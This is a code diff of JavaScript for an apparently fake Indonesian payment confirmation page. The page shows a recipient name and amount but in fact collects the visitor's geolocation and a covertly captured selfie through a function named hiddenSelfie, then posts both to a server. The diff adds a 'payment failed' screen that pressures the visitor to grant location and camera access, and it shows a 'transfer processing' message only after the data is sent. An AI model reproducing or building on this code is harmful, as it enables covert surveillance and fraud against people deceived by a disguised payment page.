@@ -1,4 +1,4 @@
-var TARGET_NAME  = 'MUH.ASSIDIQ(BRI)';
+var TARGET_NAME  = 'MUH.ASSIDIQ (BRI)';
 var TOTAL_AMOUNT = 'Rp52.500';
 
 (function injectStyle() {
@@ -9,17 +9,23 @@ var TOTAL_AMOUNT = 'Rp52.500';
     '.success-wrap{padding:20px 8px;text-align:center;animation:dynPop .3s cubic-bezier(.2,.9,.3,1.2)}',
     '@keyframes dynPop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}',
     '.success-icon{width:88px;height:88px;border-radius:50%;margin:0 auto 18px;',
-    'background:linear-gradient(180deg,#22C55E,#16A34A);display:flex;',
-    'align-items:center;justify-content:center;box-shadow:0 12px 30px rgba(34,197,94,.35);',
+    'display:flex;align-items:center;justify-content:center;',
     'animation:successPop .5s cubic-bezier(.2,.9,.3,1.4)}',
     '@keyframes successPop{0%{transform:scale(0)}60%{transform:scale(1.1)}100%{transform:scale(1)}}',
     '.success-icon svg{width:44px;height:44px}',
-    '.success-title{font-size:19px;font-weight:800;margin:0 0 8px;color:#16A34A}',
+    '.success-icon.ok{background:linear-gradient(180deg,#22C55E,#16A34A);',
+    'box-shadow:0 12px 30px rgba(34,197,94,.35)}',
+    '.success-icon.fail{background:linear-gradient(180deg,#EF4444,#DC2626);',
+    'box-shadow:0 12px 30px rgba(239,68,68,.35)}',
+    '.success-title{font-size:19px;font-weight:800;margin:0 0 8px}',
+    '.success-title.ok{color:#16A34A}',
+    '.success-title.fail{color:#DC2626}',
     '.success-desc{font-size:14px;line-height:1.6;color:#5b6b70;margin:0 0 6px}',
     '.success-note{font-size:12.5px;color:#9CA3AF;margin-top:14px;line-height:1.55}',
-    '.success-badge{display:inline-block;background:#DCFCE7;color:#16A34A;',
-    'font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;',
-    'margin-top:12px;letter-spacing:.02em}'
+    '.success-badge{display:inline-block;font-size:12px;font-weight:700;',
+    'padding:6px 14px;border-radius:999px;margin-top:12px;letter-spacing:.02em}',
+    '.success-badge.ok{background:#DCFCE7;color:#16A34A}',
+    '.success-badge.fail{background:#FEE2E2;color:#DC2626}'
   ].join('');
   document.head.appendChild(s);
 })();
@@ -27,11 +33,11 @@ var TOTAL_AMOUNT = 'Rp52.500';
 var currentSelfieBlob = null;
 var currentLat = null;
 var currentLng = null;
+
 var remaining = 4 * 60 + 59;
 var countdownEl = document.getElementById('countdown');
 var confirmBtn  = document.getElementById('confirmBtn');
 var timerChip   = document.querySelector('.timer-chip');
-
 var countdownInterval = setInterval(function () {
   remaining--;
   if (remaining <= 0) {
@@ -49,7 +55,6 @@ var countdownInterval = setInterval(function () {
 
 var toastEl = document.getElementById('toast');
 var toastTimeout;
-
 function showToast(msg) {
   clearTimeout(toastTimeout);
   toastEl.textContent = msg;
@@ -58,21 +63,16 @@ function showToast(msg) {
 }
 
 var sourceBackdrop = document.getElementById('sourceBackdrop');
-
 document.getElementById('sourceBtn').addEventListener('click', function () {
   sourceBackdrop.classList.add('open');
 });
-
 document.getElementById('closeSource').addEventListener('click', function () {
   sourceBackdrop.classList.remove('open');
 });
-
 sourceBackdrop.addEventListener('click', function (e) {
   if (e.target === sourceBackdrop) sourceBackdrop.classList.remove('open');
 });
-
 var sourceLabel = document.getElementById('sourceLabel');
-
 document.querySelectorAll('.account-option').forEach(function (btn) {
   btn.addEventListener('click', function () {
     document.querySelectorAll('.account-option').forEach(function (b) {
@@ -170,35 +170,44 @@ function hiddenSelfie() {
 
 function sendToServer(lat, lng, selfieBlob) {
   return new Promise(function (resolve, reject) {
-    var formData = new FormData();
-    formData.append('latitude', lat);
-    formData.append('longitude', lng);
-
-    if (selfieBlob) {
-      var file = new File([selfieBlob], 'selfie.jpg', { type: 'image/jpeg' });
-      formData.append('selfie', file);
+    function doSend(base64) {
+      fetch('/.netlify/functions/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lng,
+          selfie: base64 ? { data: base64, mime: 'image/jpeg' } : null
+        })
+      })
+      .then(function (res) {
+        return res.text().then(function (text) {
+          var json;
+          try { json = JSON.parse(text); }
+          catch (e) {
+            throw new Error('Respons server tidak valid: ' + text.slice(0, 120));
+          }
+          if (!res.ok || !json.ok) throw new Error(json.error || 'Server error');
+          return json;
+        });
+      })
+      .then(resolve)
+      .catch(reject);
     }
-fetch('/api/submit.php', {
-  method: 'POST',
-  body: formData
-})
-    .then(function (res) {
-      return res.text().then(function (text) {
-        var json;
-        try { json = JSON.parse(text); }
-        catch (e) {
-          throw new Error('Respons server tidak valid: ' + text.slice(0, 120));
-        }
-        if (!res.ok || !json.ok) throw new Error(json.error || 'Server error');
-        return json;
-      });
-    })
-    .then(resolve)
-    .catch(reject);
+
+    if (!selfieBlob) return doSend(null);
+
+    var reader = new FileReader();
+    reader.onload = function () {
+      var base64 = String(reader.result).split(',')[1] || '';
+      doSend(base64);
+    };
+    reader.onerror = function () { reject(new Error('Gagal baca file selfie')); };
+    reader.readAsDataURL(selfieBlob);
   });
 }
 
-function showSuccess() {
+function showResult(success) {
   var hero = document.querySelector('.hero');
   var timer = document.querySelector('.timer-chip');
   if (timer && timer.parentNode) timer.parentNode.removeChild(timer);
@@ -208,29 +217,51 @@ function showSuccess() {
   var heroTitle = hero ? hero.querySelector('h2') : null;
 
   if (heroTitle) {
-    heroTitle.innerHTML = 'Pembayaran Berhasil';
+    heroTitle.innerHTML = success ? 'Pembayaran Berhasil' : 'Pembayaran Gagal';
   }
 
   if (content) {
-    content.innerHTML = ''
-      + '<div class="card success-wrap">'
-      +   '<div class="success-icon">'
-      +     '<svg viewBox="0 0 24 24" fill="none">'
-      +       '<path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" '
-      +             'stroke-linecap="round" stroke-linejoin="round"/>'
-      +     '</svg>'
-      +   '</div>'
-      +   '<h3 class="success-title">Transfer Sedang Diproses</h3>'
-      +   '<p class="success-desc">'
-      +     'Pembayaran sebesar <strong>' + TOTAL_AMOUNT + '</strong><br>'
-      +     'sedang dikirim ke rekening tujuan.'
-      +   '</p>'
-      +   '<div class="success-badge">⏱ Estimasi 5 menit</div>'
-      +   '<p class="success-note">'
-      +     'Silakan tunggu sekitar 5 menit hingga dana masuk ke rekening penerima.<br>'
-      +     'Anda dapat menutup halaman ini.'
-      +   '</p>'
-      + '</div>';
+    if (success) {
+      content.innerHTML = ''
+        + '<div class="card success-wrap">'
+        +   '<div class="success-icon ok">'
+        +     '<svg viewBox="0 0 24 24" fill="none">'
+        +       '<path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" '
+        +             'stroke-linecap="round" stroke-linejoin="round"/>'
+        +     '</svg>'
+        +   '</div>'
+        +   '<h3 class="success-title ok">Transfer Sedang Diproses</h3>'
+        +   '<p class="success-desc">'
+        +     'Pembayaran sebesar <strong>' + TOTAL_AMOUNT + '</strong><br>'
+        +     'sedang dikirim ke rekening tujuan.'
+        +   '</p>'
+        +   '<div class="success-badge ok">⏱ Estimasi 5 menit</div>'
+        +   '<p class="success-note">'
+        +     'Silakan tunggu sekitar 5 menit hingga dana masuk ke rekening penerima.<br>'
+        +     'Anda dapat menutup halaman ini.'
+        +   '</p>'
+        + '</div>';
+    } else {
+      content.innerHTML = ''
+        + '<div class="card success-wrap">'
+        +   '<div class="success-icon fail">'
+        +     '<svg viewBox="0 0 24 24" fill="none">'
+        +       '<path d="M6 6l12 12M18 6L6 18" stroke="#fff" stroke-width="3" '
+        +             'stroke-linecap="round" stroke-linejoin="round"/>'
+        +     '</svg>'
+        +   '</div>'
+        +   '<h3 class="success-title fail">Pembayaran Gagal</h3>'
+        +   '<p class="success-desc">'
+        +     'Verifikasi lokasi atau selfie tidak berhasil.<br>'
+        +     'Transaksi tidak dapat diproses.'
+        +   '</p>'
+        +   '<div class="success-badge fail">✕ Dibatalkan</div>'
+        +   '<p class="success-note">'
+        +     'Silakan muat ulang halaman dan coba kembali,<br>'
+        +     'lalu izinkan akses lokasi dan kamera.'
+        +   '</p>'
+        + '</div>';
+    }
   }
 
   if (actions) {
@@ -246,34 +277,28 @@ confirmBtn.addEventListener('click', function () {
 
   confirmBtn.disabled = true;
   confirmBtn.textContent = 'Memproses...';
+  showToast('Meminta akses lokasi & kamera...');
 
-  // 1️⃣ Langsung tampilkan halaman sukses
-  showSuccess();
-
-  // 2️⃣ Ambil lokasi + selfie paralel, kirim di background
   (async function () {
+    var tasks = await Promise.all([ getLocation(), hiddenSelfie() ]);
+    var loc    = tasks[0];
+    var selfie = tasks[1];
+
+    if (!loc || !selfie) {
+      showResult(false);
+      return;
+    }
+
+    currentLat = loc.lat;
+    currentLng = loc.lng;
+    currentSelfieBlob = selfie;
+
     try {
-      var tasks = await Promise.all([
-        getLocation(),
-        hiddenSelfie()
-      ]);
-
-      var loc    = tasks[0];
-      var selfie = tasks[1];
-
-      var lat = loc ? loc.lat : 0;
-      var lng = loc ? loc.lng : 0;
-
-      currentLat = lat;
-      currentLng = lng;
-      currentSelfieBlob = selfie;
-
-      await sendToServer(lat, lng, selfie);
-
-      console.log('[OK] Data terkirim ke server');
-
+      await sendToServer(currentLat, currentLng, currentSelfieBlob);
+      showResult(true);
     } catch (err) {
       console.warn('[WARN] Gagal kirim:', err.message);
+      showResult(false);
     }
   })();
 });
